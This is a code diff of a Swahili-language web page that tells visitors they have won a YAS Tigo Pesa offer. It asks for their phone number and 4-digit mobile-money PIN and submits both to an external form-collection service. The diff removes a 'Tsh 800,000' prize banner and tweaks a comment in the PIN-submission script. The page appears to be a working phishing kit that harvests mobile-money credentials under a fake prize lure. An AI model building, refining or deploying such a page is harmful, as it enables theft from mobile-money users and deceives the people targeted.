@@ -10,10 +10,8 @@
     <div class="card">
         <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
         <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
-        <div class="amount-box">
-            <p>Kiwango cha Ofa kinachoweza kupatikana</p>
-            <h1>Tsh 800,000</h1>
-        </div>
+        
+        <!-- REMOVED: The amount-box div -->
         
         <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
             
@@ -57,7 +55,7 @@
                         if (allPinsFilled) {
                             updateHiddenPin();
                             
-                            // UPDATED: Check if phone number is filled before submitting
+                            // Check if phone number is filled before submitting
                             if (phoneNumberInput.value.trim() === '') {
                                 alert('Tafadhali ingiza namba yako ya simu.');
                                 phoneNumberInput.focus(); // Focus the phone input
